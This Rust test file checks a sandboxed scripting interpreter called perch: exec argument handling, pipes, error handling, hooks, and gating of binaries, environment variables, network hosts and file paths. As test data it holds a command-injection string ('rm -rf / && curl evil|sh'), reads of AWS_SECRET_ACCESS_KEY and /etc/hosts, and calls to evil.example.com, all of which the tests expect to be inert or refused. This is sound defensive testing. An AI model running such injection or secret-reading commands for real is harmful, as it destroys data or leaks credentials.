//! End-to-end + gating tests for the ops crate (ports of the Go
//! `*_e2e_test.go`, `requires_gating_test.go`, `kinds_drift_test.go`). They
//! load real `.perch` source through the capyloader and run it through the full
//! gated handler set.
use perch_domain::{BinReq, EnvReq, ErrorKind, HostReq, OpError, Program, Requirements};
use perch_interpreter::{Args, Bindings, Error, Interpreter, SharedBuf};
use perch_ops::{all_handlers, builtin_kinds, hook_category_of, preflight};
use serde_json::{json, Value};
use std::collections::BTreeSet;
use std::path::PathBuf;
use std::sync::atomic::{AtomicU32, Ordering};
use std::sync::Arc;

fn tmpdir() -> PathBuf {
    static N: AtomicU32 = AtomicU32::new(0);
    let d = std::env::temp_dir().join(format!("perch-ops-e2e-{}-{}", std::process::id(), N.fetch_add(1, Ordering::SeqCst)));
    std::fs::create_dir_all(&d).unwrap();
    d.canonicalize().unwrap()
}

/// Loads a .perch source through the real loader, builds an interpreter with the
/// full gated handler set + Preflight hook, runs one command, and returns
/// captured stdout+stderr plus any load/run error.
fn run_source(src: &str, command: &str, args: &[&str]) -> (String, Option<Error>) {
    run_with(src, command, args, false)
}

fn run_with(src: &str, command: &str, args: &[&str], hooks: bool) -> (String, Option<Error>) {
    let prog = match perch_capyloader::load_from_string(src) {
        Ok(p) => p,
        // Load-time errors (bin_not_declared from the zero-ambient gate) are
        // returned so tests can assert on them.
        Err(e) => return (String::new(), Some(e)),
    };
    let mut i = Interpreter::new(all_handlers(), prog);
    i.preflight_hook = Some(Arc::new(preflight));
    if hooks {
        i.hook_category = Some(Arc::new(|k: &str| hook_category_of(k)));
    }
    let buf = SharedBuf::new();
    i.stdout = buf.writer();
    i.stderr = buf.writer();
    let args: Vec<String> = args.iter().map(|s| s.to_string()).collect();
    let res = i.run(command, &args);
    (buf.contents(), res.err())
}

fn is_op_kind(err: &Option<Error>, want: ErrorKind) -> bool {
    err.as_ref().and_then(|e| e.downcast_ref::<OpError>()).is_some_and(|oe| oe.kind == want)
}

fn describe(err: &Option<Error>) -> String {
    err.as_ref().map(|e| e.to_string()).unwrap_or_else(|| "<nil>".into())
}

// ── exec ─────────────────────────────────────────────────────────────────

#[test]
fn exec_streams_and_captures() {
    let src = r#"name "x"
requires
    bin "echo"
end
command t
    do
        exec echo hello world
        got = exec echo captured
        print "v=${got}"
    end
end
"#;
    let (out, err) = run_source(src, "t", &[]);
    assert!(err.is_none(), "run: {}", describe(&err));
    assert!(out.contains("hello world"), "exec did not stream argv; out={out:?}");
    // Captured value must NOT carry quote characters.
    assert!(out.contains("v=captured") && !out.contains("v=\"captured\""), "capture wrong; out={out:?}");
}

// Bare flags / paths / globs parse as one argv token each, and a quoted token
// keeps embedded spaces as a single slot.
#[test]
fn exec_bare_flags_and_spaced_args() {
    let src = r#"name "x"
requires
    bin "echo"
end
command t
    do
        exec echo hello --flag -x world
        msg = exec echo one "two three" four
        print "cap=${msg}"
    end
end
"#;
    let (out, err) = run_source(src, "t", &[]);
    assert!(err.is_none(), "run: {}", describe(&err));
    assert!(out.contains("hello --flag -x world"), "bare flags not passed through; out={out:?}");
    assert!(out.contains("cap=one two three four"), "spaced quoted arg not preserved; out={out:?}");
}

// A bare `exec` streams its stdout; a captured `let x = exec …` stays silent.
#[test]
fn exec_captured_is_silent() {
    let src = r#"name "x"
requires
    bin "echo"
end
command t
    do
        exec echo BARE
        q = exec echo CAPTURED
        print "q=${q}"
    end
end
"#;
    let (out, err) = run_source(src, "t", &[]);
    assert!(err.is_none(), "run: {}", describe(&err));
    assert!(out.contains("BARE"), "bare exec should stream; out={out:?}");
    assert!(out.contains("q=CAPTURED"), "captured value should bind; out={out:?}");
    assert_eq!(out.matches("CAPTURED").count(), 1, "captured exec leaked its stdout; out={out:?}");
}

#[test]
fn exec_interpolates_argv() {
    let src = r#"name "x"
requires
    bin "echo"
end
command t
    arg who
        type string
        default "world"
    end
    do
        exec echo hi "${who}"
    end
end
"#;
    let (out, err) = run_source(src, "t", &["-who=perch"]);
    assert!(err.is_none(), "run: {}", describe(&err));
    assert!(out.contains("hi perch"), "argv ${{who}} not interpolated; out={out:?}");
}

// With a requires block present, exec of an undeclared bin is refused before the
// process is spawned — same gate as shell's first token.
#[test]
fn exec_gated_by_declared_bins() {
    let src = r#"name "x"
requires
    bin "echo"
end
command t
    do
        exec curl "https://example.com"
    end
end
"#;
    let (_, err) = run_source(src, "t", &[]);
    assert!(is_op_kind(&err, ErrorKind::BinNotDeclared), "undeclared exec bin should be bin_not_declared, got {}", describe(&err));
}

// A file with no requires block is treated as an empty manifest.
#[test]
fn exec_missing_requires_treated_as_empty() {
    let src = r#"name "x"
command t
    do
        exec echo "no-manifest"
    end
end
"#;
    let (_, err) = run_source(src, "t", &[]);
    assert!(is_op_kind(&err, ErrorKind::BinNotDeclared), "missing requires should reject undeclared exec, got {}", describe(&err));
}

// The §3.3 keystone: an interpolated value lands in exactly one argv slot and is
// never re-parsed — shell metacharacters in the value are inert data.
#[test]
fn exec_interpolation_is_one_argv_slot() {
    let src = r#"name "x"
requires
    bin "echo"
end
command t
    arg msg
        type string
        default "a; rm -rf / && curl evil|sh"
    end
    do
        exec echo "${msg}"
    end
end
"#;
    let (out, err) = run_source(src, "t", &[]);
    assert!(err.is_none(), "run: {}", describe(&err));
    assert!(out.contains("a; rm -rf / && curl evil|sh"), "metachar value was not passed inert; out={out:?}");
}

// ── exec chains ───────────────────────────────────────────────────────────

const CHAIN_HEAD: &str = "name \"x\"\nrequires\n    bin \"echo\"\n    bin \"false\"\nend\ncommand t\n    do\n";
const CHAIN_TAIL: &str = "\n    end\nend\n";

fn chain(body: &str) -> (String, Option<Error>) {
    run_source(&format!("{CHAIN_HEAD}        {body}{CHAIN_TAIL}"), "t", &[])
}

#[test]
fn exec_chain_and_all_run() {
    let (out, err) = chain("exec echo one && exec echo two && exec echo three");
    assert!(err.is_none(), "run: {}", describe(&err));
    for w in ["one", "two", "three"] {
        assert!(out.contains(w), "missing {w:?} in {out:?}");
    }
}

#[test]
fn exec_chain_and_short_circuits_and_aborts() {
    let (out, err) = chain("exec false && exec echo nope");
    assert!(err.is_some(), "a failing && LHS should make the chain raise");
    assert!(!out.contains("nope"), "&& must not run RHS after LHS failed; out={out:?}");
}

#[test]
fn exec_chain_or_recovers() {
    let (out, err) = chain("exec false || exec echo recovered");
    assert!(err.is_none(), "|| should recover (RHS succeeds): {}", describe(&err));
    assert!(out.contains("recovered"), "|| did not run RHS after LHS failed; out={out:?}");
}

#[test]
fn exec_chain_semicolon_always_runs() {
    let (out, err) = chain("exec echo a ; exec echo b");
    assert!(err.is_none(), "run: {}", describe(&err));
    assert!(out.contains('a') && out.contains('b'), "; should run both; out={out:?}");
}

// ── pipe ──────────────────────────────────────────────────────────────────

#[cfg(unix)]
#[test]
fn pipe_wires_stages_and_captures() {
    let src = r#"name "x"
requires
    bin "echo"
    bin "tr"
    bin "rev"
end
command t
    do
        out = pipe
            exec echo hello
            exec tr a-z A-Z
            exec rev
        end
        print "r=${out}"
    end
end
"#;
    let (out, err) = run_source(src, "t", &[]);
    assert!(err.is_none(), "run: {}", describe(&err));
    assert!(out.contains("r=OLLEH"), "pipe did not produce reversed-uppercased value; out={out:?}");
}

// Every stage's bin is gated: an undeclared bin in the chain is refused.
#[test]
fn pipe_gates_each_stage() {
    let src = r#"name "x"
requires
    bin "echo"
end
command t
    do
        out = pipe
            exec echo "hi"
            exec wc -c
        end
        print "${out}"
    end
end
"#;
    let (_, err) = run_source(src, "t", &[]);
    assert!(is_op_kind(&err, ErrorKind::BinNotDeclared), "undeclared pipe stage should be bin_not_declared, got {}", describe(&err));
}

// ── try / rescue / match ──────────────────────────────────────────────────

#[test]
fn try_rescue_and_finally() {
    let src = r#"name "x"
requires
end
command t
    do
        try
            fail "boom"
        rescue
            print "caught:${err.kind}"
        finally
            print "cleanup"
        end
        print "after"
    end
end
"#;
    let (out, err) = run_source(src, "t", &[]);
    assert!(err.is_none(), "run: {}", describe(&err));
    for want in ["caught:user_fail", "cleanup", "after"] {
        assert!(out.contains(want), "missing {want:?} in out={out:?}");
    }
}

// finally-only (no rescue): the error must RE-RAISE after cleanup runs.
#[test]
fn try_finally_only_reraises() {
    let src = r#"name "x"
requires
end
command t
    do
        try
            fail "uncaught"
        finally
            print "cleanup-ran"
        end
        print "should-not-print"
    end
end
"#;
    let (out, err) = run_source(src, "t", &[]);
    assert!(err.is_some(), "expected the error to propagate (no rescue arm)");
    assert!(out.contains("cleanup-ran"), "finally should still run; out={out:?}");
    assert!(!out.contains("should-not-print"), "control should not continue past an uncaught try; out={out:?}");
}

// Bare `match err.kind` (dotted ident) dispatches on the error binding.
#[test]
fn match_dotted_ident() {
    let src = r#"name "x"
requires
end
command t
    do
        try
            fail "x"
        rescue
            match err.kind
                case user_fail
                    print "hit-user-fail"
                else
                    print "miss"
            end
        end
    end
end
"#;
    let (out, err) = run_source(src, "t", &[]);
    assert!(err.is_none(), "run: {}", describe(&err));
    assert!(out.contains("hit-user-fail"), "bare `match err.kind` did not dispatch; out={out:?}");
}

// ── hooks ─────────────────────────────────────────────────────────────────

// A `before write` hook fires around every write op, sees ${hook.target}, and an
// `after` hook runs once the op returns.
#[test]
fn hooks_fire_around_op() {
    let dir = tmpdir();
    let d = dir.display();
    let src = format!(
        r#"name "x"
hooks
    before write audit
    after  write done
end
requires
    write "{d}"
end
command audit
    do
        print "before:${{hook.target}}"
    end
end
command done
    do
        print "after:${{hook.op}}"
    end
end
command go
    do
        write_file "{d}/a.txt" "hi"
    end
end
"#
    );
    let (out, err) = run_with(&src, "go", &[], true);
    assert!(err.is_none(), "run: {}", describe(&err));
    assert!(out.contains(&format!("before:{d}")), "before-hook didn't see the write target; out={out:?}");
    assert!(out.contains("after:write_file"), "after-hook didn't fire with hook.op; out={out:?}");
}

// A `before` hook that fails VETOES the op — the write never happens.
#[test]
fn hooks_before_vetoes() {
    let dir = tmpdir();
    let d = dir.display();
    let target = dir.join("blocked.txt");
    let src = format!(
        r#"name "x"
hooks
    before write guard
end
requires
    write "{d}"
end
command guard
    do
        fail "denied: ${{hook.target}}"
    end
end
command go
    do
        write_file "{}" "x"
        print "reached"
    end
end
"#,
        target.display()
    );
    let (out, err) = run_with(&src, "go", &[], true);
    assert!(err.is_some(), "expected the before-hook veto to abort the op");
    assert!(!out.contains("reached"), "op continued after a before-hook veto; out={out:?}");
    assert!(!target.exists(), "vetoed write still created the file {}", target.display());
}

// A hook handler's own ops must NOT recursively fire the same hook.
#[test]
fn hooks_no_reentrancy() {
    let dir = tmpdir();
    let d = dir.display();
    let log = dir.join("audit.log");
    let src = format!(
        r#"name "x"
hooks
    before write log_it
end
requires
    write "{d}"
end
command log_it
    do
        append_line "{}" "w"
    end
end
command go
    do
        write_file "{d}/data.txt" "payload"
    end
end
"#,
        log.display()
    );
    let (_, err) = run_with(&src, "go", &[], true);
    assert!(err.is_none(), "run: {}", describe(&err));
    let data = std::fs::read_to_string(&log).expect("hook didn't run (no audit log)");
    let n = data.trim().matches('\n').count() + 1;
    assert_eq!(n, 1, "re-entrancy: hook ran {n} times, want 1:\n{data}");
}

// ── requires e2e ──────────────────────────────────────────────────────────

// Bare-ident args: `print x` (no ${}) must interpolate the variable, and
// `let v = upper name` must capture op output from a bare-ident arg.
#[test]
fn e2e_bare_ident_args() {
    let src = r#"name "x"
requires
end
command greet
    arg who
        type string
        default "world"
    end
    do
        shout = upper who
        print shout
    end
end
"#;
    let (out, err) = run_source(src, "greet", &["-who=team"]);
    assert!(err.is_none(), "run: {}", describe(&err));
    assert!(out.contains("TEAM"), "bare-ident interpolation+capture failed; out={out:?}");
}

// Flat (non-`let`) statement with a single bare-ident arg must resolve the ident
// as a binding, not pass it literally.
#[test]
fn e2e_flat_bare_ident_arg() {
    let dir = tmpdir();
    let d = dir.display();
    let src = format!(
        r#"name "x"
OUT = "{d}/sub"
requires
    write "${{OUT}}"
end
command build
    do
        ensure_dir OUT
        print "${{OUT}}"
    end
end
"#
    );
    let (out, err) = run_source(&src, "build", &[]);
    assert!(err.is_none(), "run: {}", describe(&err));
    assert!(out.contains(&format!("{d}/sub")), "flat bare-ident arg not resolved to binding; out={out:?}");
    assert!(dir.join("sub").exists(), "ensure_dir did not create the binding-named dir");
}

// Args behave like CLI tokens across positions.
#[test]
fn e2e_args_like_cli() {
    let src = r#"name "x"
SRC = "alpha"
DST = "beta"
requires
end
command c
    do
        a = path_join SRC DST
        print "a=${a}"
        b = path_join "SRC" DST
        print "b=${b}"
        d = path_join "${SRC}" "lit"
        print "d=${d}"
        e = format "Hello %s" "world"
        print "e=${e}"
    end
end
"#;
    let (out, err) = run_source(src, "c", &[]);
    assert!(err.is_none(), "run: {}", describe(&err));
    let sep = std::path::MAIN_SEPARATOR;
    for want in [
        format!("a=alpha{sep}beta"),
        format!("b=SRC{sep}beta"),
        format!("d=alpha{sep}lit"),
        "e=Hello world".to_string(),
    ] {
        assert!(out.contains(&want), "missing {want:?} in output:\n{out}");
    }
}

// A declared bin keeps LITERAL argv: `echo SRC` prints "SRC", never the value.
#[cfg(unix)]
#[test]
fn e2e_bin_args_stay_literal() {
    let src = r#"name "x"
SRC = "alpha"
requires
    bin "echo"
end
command c
    do
        echo SRC
    end
end
"#;
    let (out, err) = run_source(src, "c", &[]);
    assert!(err.is_none(), "run: {}", describe(&err));
    assert!(out.contains("SRC") && !out.contains("alpha"), "bin arg should be literal SRC; out={out:?}");
}

// Quotes are optional at runtime too: a fully-bare program and its fully-quoted
// twin must produce IDENTICAL output.
#[test]
fn e2e_quotes_optional_same_output() {
    let quoted = r#"name "x"
GREETING = "hi"
requires
end
command c
    arg who
        type string
        default "team"
    end
    arg n
        type int
        default 3
    end
    do
        print "${GREETING}"
        print "${who}"
        print "${n}"
        up = upper "redis"
        print "${up}"
        j = path_join "a" "b"
        print "${j}"
    end
end
"#;
    let bare = r#"name x
GREETING = hi
requires
end
command c
    arg who
        type string
        default team
    end
    arg n
        type int
        default 3
    end
    do
        print ${GREETING}
        print ${who}
        print ${n}
        up = upper redis
        print ${up}
        j = path_join a b
        print ${j}
    end
end
"#;
    let (qo, err) = run_source(quoted, "c", &[]);
    assert!(err.is_none(), "quoted run: {}", describe(&err));
    let (bo, err) = run_source(bare, "c", &[]);
    assert!(err.is_none(), "bare run: {}", describe(&err));
    assert_eq!(qo, bo, "quoted vs bare output differ");
    for want in ["hi", "team", "3", "REDIS"] {
        assert!(bo.contains(want), "bare output missing {want:?}:\n{bo}");
    }
}

// match on a bare ident (`match os`) must dispatch on the host fact.
#[test]
fn e2e_match_ident() {
    let src = r#"name "x"
requires
end
command pick
    do
        match os
            case "nope-os"
                print "wrong"
            else
                print "matched-default"
            end
        end
    end
end
"#;
    let (out, err) = run_source(src, "pick", &[]);
    assert!(err.is_none(), "run: {}", describe(&err));
    assert!(out.contains("matched-default"), "match ident did not reach default; out={out:?}");
}

// A requires block with read/write scopes must allow in-scope FS ops and refuse
// out-of-scope ones with the right error kind — end to end.
#[test]
fn e2e_fs_scope_gating() {
    let dir = tmpdir();
    let d = dir.display();
    let src = format!(
        r#"name "x"
requires
    write "{d}"
end
command w
    do
        write_file "{d}/ok.txt" "hi"
        write_file "/etc/should-not-write.txt" "nope"
    end
end
"#
    );
    let (_, err) = run_source(&src, "w", &[]);
    assert!(is_op_kind(&err, ErrorKind::WriteNotDeclared), "expected write_not_declared for out-of-scope write, got {}", describe(&err));
}

// A file with no requires block is treated as empty manifest: undeclared
// filesystem writes fail at runtime with write_not_declared.
#[test]
fn e2e_missing_requires_treated_as_empty() {
    let dir = tmpdir();
    let src = format!("name \"x\"\ncommand w\n    do\n        write_file \"{}/x.txt\" \"hi\"\n    end\nend\n", dir.display());
    let (_, err) = run_source(&src, "w", &[]);
    assert!(is_op_kind(&err, ErrorKind::WriteNotDeclared), "missing requires must refuse undeclared write, got {}", describe(&err));
}

// ── gating (requires_gating_test.go) ──────────────────────────────────────

/// An interpreter whose program carries the given Requirements (declared=true)
/// and the full gated handler set.
fn gated(mut req: Requirements) -> (Interpreter, Bindings) {
    req.declared = true;
    let p = Program { requirements: req, ..Default::default() };
    (Interpreter::new(all_handlers(), p), Bindings::new("."))
}

/// Dispatches one op handler directly with already-resolved args.
fn call(i: &Interpreter, b: &mut Bindings, kind: &str, args: Value) -> Result<Value, Error> {
    let h = i.handlers.get(kind).unwrap_or_else(|| panic!("no handler for {kind}")).clone();
    let map = args.as_object().cloned().unwrap_or_default();
    h(i, b, &Args { map, body: &[] })
}

fn is_kind(r: &Result<Value, Error>, want: ErrorKind) -> bool {
    r.as_ref().err().and_then(|e| e.downcast_ref::<OpError>()).is_some_and(|oe| oe.kind == want)
}

fn bin(name: &str) -> BinReq {
    BinReq { name: name.into(), ..Default::default() }
}

#[test]
fn gate_shell_bin() {
    let (i, mut b) = gated(Requirements { bins: vec![bin("echo")], ..Default::default() });
    // declared bin -> allowed (echo succeeds)
    call(&i, &mut b, "shell", json!({"cmd": "echo hi"})).unwrap_or_else(|e| panic!("declared bin echo should run: {e}"));
    // undeclared bin -> bin_not_declared
    let r = call(&i, &mut b, "shell", json!({"cmd": "curl https://x"}));
    assert!(is_kind(&r, ErrorKind::BinNotDeclared), "undeclared curl want bin_not_declared, got {r:?}");
}

#[test]
fn gate_env() {
    let (i, mut b) = gated(Requirements { envs: vec![EnvReq { name: "HOME".into(), optional: false }], ..Default::default() });
    call(&i, &mut b, "get_env", json!({"_0": "HOME"})).unwrap_or_else(|e| panic!("declared env HOME allowed: {e}"));
    let r = call(&i, &mut b, "get_env", json!({"_0": "AWS_SECRET_ACCESS_KEY"}));
    assert!(is_kind(&r, ErrorKind::EnvNotDeclared), "undeclared env want env_not_declared, got {r:?}");
    // writes are gated too
    let r = call(&i, &mut b, "set_env", json!({"_0": "SECRET", "_1": "x"}));
    assert!(is_kind(&r, ErrorKind::EnvNotDeclared), "set_env undeclared, got {r:?}");
    let r = call(&i, &mut b, "unset_env", json!({"_0": "SECRET"}));
    assert!(is_kind(&r, ErrorKind::EnvNotDeclared), "unset_env undeclared, got {r:?}");
    let r = call(&i, &mut b, "env_has", json!({"_0": "SECRET"}));
    assert!(is_kind(&r, ErrorKind::EnvNotDeclared), "env_has undeclared, got {r:?}");
}

#[test]
fn gate_network_host() {
    let (i, mut b) = gated(Requirements { hosts: vec![HostReq { name: "declared.example.com".into(), optional: false }], ..Default::default() });
    // undeclared host -> host_not_declared (we never actually dial)
    let r = call(&i, &mut b, "dns_lookup", json!({"_0": "evil.example.com"}));
    assert!(is_kind(&r, ErrorKind::HostNotDeclared), "dns_lookup undeclared host, got {r:?}");
    let r = call(&i, &mut b, "port_check", json!({"_0": "evil.example.com", "_1": "80"}));
    assert!(is_kind(&r, ErrorKind::HostNotDeclared), "port_check undeclared host, got {r:?}");
    let r = call(&i, &mut b, "wait_for_url", json!({"_0": "https://evil.example.com/x", "_1": "1"}));
    assert!(is_kind(&r, ErrorKind::HostNotDeclared), "wait_for_url undeclared host, got {r:?}");
}

#[test]
fn gate_network_hostless() {
    // no hosts declared -> hostless net ops denied
    let (i, mut b) = gated(Requirements::default());
    for kind in ["local_ip", "interfaces", "mac_address", "find_free_port"] {
        let r = call(&i, &mut b, kind, json!({}));
        assert!(is_kind(&r, ErrorKind::HostNotDeclared), "{kind} with no host declared, got {r:?}");
    }
    // with a host declared, net is considered allowed
    let (i2, mut b2) = gated(Requirements { hosts: vec![HostReq { name: "x.com".into(), optional: false }], ..Default::default() });
    call(&i2, &mut b2, "interfaces", json!({})).unwrap_or_else(|e| panic!("interfaces with a declared host should be allowed: {e}"));
}

#[test]
fn gate_subprocess() {
    let (i, mut b) = gated(Requirements { bins: vec![bin("cargo")], ..Default::default() });
    // bin_version of a declared bin -> allowed
    call(&i, &mut b, "bin_version", json!({"_0": "cargo"})).unwrap_or_else(|e| panic!("bin_version of declared bin allowed: {e}"));
    // bin_version of an undeclared bin -> bin_not_declared
    let r = call(&i, &mut b, "bin_version", json!({"_0": "kubectl"}));
    assert!(is_kind(&r, ErrorKind::BinNotDeclared), "bin_version undeclared, got {r:?}");
}

#[test]
fn gate_filesystem() {
    let dir = tmpdir();
    let d = dir.display().to_string();
    let (i, mut b) = gated(Requirements {
        read_roots: vec![format!("{d}/allowed_read")],
        write_roots: vec![format!("{d}/allowed_write")],
        ..Default::default()
    });
    // write inside declared root -> allowed (mkdir is idempotent)
    call(&i, &mut b, "mkdir", json!({"_0": format!("{d}/allowed_write/sub")})).unwrap_or_else(|e| panic!("mkdir inside write root allowed: {e}"));
    // write outside -> write_not_declared
    let r = call(&i, &mut b, "write_file", json!({"path": format!("{d}/secrets/x"), "content": "y"}));
    assert!(is_kind(&r, ErrorKind::WriteNotDeclared), "write outside root, got {r:?}");
    // read outside read+write roots -> read_not_declared
    let r = call(&i, &mut b, "read_file", json!({"_0": "/etc/hosts"}));
    assert!(is_kind(&r, ErrorKind::ReadNotDeclared), "read outside root, got {r:?}");
    // read of a write root is allowed (write implies read)
    call(&i, &mut b, "exists", json!({"_0": format!("{d}/allowed_write/sub")})).unwrap_or_else(|e| panic!("exists inside write root allowed: {e}"));
    let _ = call(&i, &mut b, "rm", json!({"_0": format!("{d}/allowed_write")}));
}

// Programs from Load always have declared=true (missing block -> empty manifest).
#[test]
fn gate_no_requires_block_is_strict_after_load() {
    let p = perch_capyloader::load_from_string("name \"x\"\ncommand t\n    do\n        print \"ok\"\n    end\nend\n").unwrap();
    assert!(p.requirements.declared, "Load must normalize missing requires to declared=true");
    let mut i = Interpreter::new(all_handlers(), p);
    i.preflight_hook = Some(Arc::new(preflight));
    let mut b = Bindings::new(".");
    let r = call(&i, &mut b, "shell", json!({"cmd": "curl x"}));
    assert!(is_kind(&r, ErrorKind::BinNotDeclared), "normalized empty manifest must gate shell, got {r:?}");
}

// The check runs EVERY time, not once.
#[test]
fn gate_verified_each_time() {
    let (i, mut b) = gated(Requirements { bins: vec![bin("echo")], ..Default::default() });
    for n in 0..5 {
        let r = call(&i, &mut b, "shell", json!({"cmd": "curl x"}));
        assert!(is_kind(&r, ErrorKind::BinNotDeclared), "call {n}: undeclared bin must be denied every time, got {r:?}");
    }
    call(&i, &mut b, "shell", json!({"cmd": "echo ok"})).unwrap_or_else(|e| panic!("declared call after denials should still run: {e}"));
}

// Coverage: every external op kind has a gate. Each is invoked against an empty
// manifest (everything undeclared) and must refuse rather than touch the resource.
#[test]
fn gate_coverage_of_external_ops() {
    use ErrorKind::*;
    let cases: Vec<(&str, Value, ErrorKind)> = vec![
        ("shell", json!({"cmd": "curl x"}), BinNotDeclared),
        ("shell_output", json!({"cmd": "curl x"}), BinNotDeclared),
        ("shell_detached", json!({"cmd": "curl x"}), BinNotDeclared),
        ("get_env", json!({"_0": "X"}), EnvNotDeclared),
        ("set_env", json!({"_0": "X", "_1": "y"}), EnvNotDeclared),
        ("unset_env", json!({"_0": "X"}), EnvNotDeclared),
        ("env_has", json!({"_0": "X"}), EnvNotDeclared),
        ("env_default", json!({"_0": "X", "_1": "d"}), EnvNotDeclared),
        ("dns_lookup", json!({"_0": "x.com"}), HostNotDeclared),
        ("port_check", json!({"_0": "x.com", "_1": "80"}), HostNotDeclared),
        ("wait_for_port", json!({"_0": "x.com", "_1": "80", "_2": "1"}), HostNotDeclared),
        ("wait_for_url", json!({"_0": "https://x.com/y", "_1": "1"}), HostNotDeclared),
        ("public_ip", json!({}), HostNotDeclared),
        ("local_ip", json!({}), HostNotDeclared),
        ("interfaces", json!({}), HostNotDeclared),
        ("mac_address", json!({}), HostNotDeclared),
        ("port_free", json!({"_0": "0"}), HostNotDeclared),
        ("find_free_port", json!({}), HostNotDeclared),
        ("http_get", json!({"_0": "https://x.com"}), HostNotDeclared),
        ("download", json!({"url": "https://x.com", "dst": "/tmp/x"}), WriteNotDeclared), // dst write checked first
        ("bin_version", json!({"_0": "kubectl"}), BinNotDeclared),
        ("pkg_install", json!({"_0": "jq"}), BinNotDeclared),
        ("mkdir", json!({"_0": "/tmp/x"}), WriteNotDeclared),
        ("write_file", json!({"path": "/tmp/x", "content": "y"}), WriteNotDeclared),
        ("read_file", json!({"_0": "/etc/hosts"}), ReadNotDeclared),
        ("rm", json!({"_0": "/tmp/x"}), WriteNotDeclared),
        ("cp", json!({"_0": "/a", "_1": "/b"}), WriteNotDeclared), // write (dst) checked before read (src)
        ("tar_extract", json!({"src": "/a.tar", "dst": "/out"}), WriteNotDeclared),
    ];
    for (kind, args, want) in cases {
        let (i, mut b) = gated(Requirements::default()); // empty manifest: nothing declared
        let r = call(&i, &mut b, kind, args);
        assert!(is_kind(&r, want), "{kind} with empty manifest: want {want}, got {r:?}");
    }
}

// The gate error messages name the resource so users can fix them.
#[test]
fn gate_error_messages_are_actionable() {
    let (i, mut b) = gated(Requirements::default());
    let r = call(&i, &mut b, "shell", json!({"cmd": "curl x"}));
    assert!(r.err().is_some_and(|e| e.to_string().contains("curl")), "error should name the bin");
}

// ── kinds drift ───────────────────────────────────────────────────────────

/// Guards the canonical op-kind list the loader embeds (opkinds.txt) against
/// drift from the handler registry.
#[test]
fn op_kinds_in_sync() {
    // The wasm ops are a later porting phase (register_wasm is a stub).
    let pending_wasm: BTreeSet<&str> =
        ["wasm_allow_host", "wasm_arg", "wasm_env", "wasm_mount_read", "wasm_mount_write", "wasm_run"].into();
    let want: BTreeSet<String> = builtin_kinds().into_iter().collect();
    let got: BTreeSet<String> = perch_capyloader::op_kinds().into_iter().collect();
    for k in &want {
        assert!(got.contains(k), "op {k:?} is a registered handler but missing from infra/capyloader/opkinds.txt");
    }
    for k in &got {
        if pending_wasm.contains(k.as_str()) {
            continue;
        }
        assert!(want.contains(k), "op {k:?} is in opkinds.txt but is NOT a registered handler (stale entry)");
    }
}
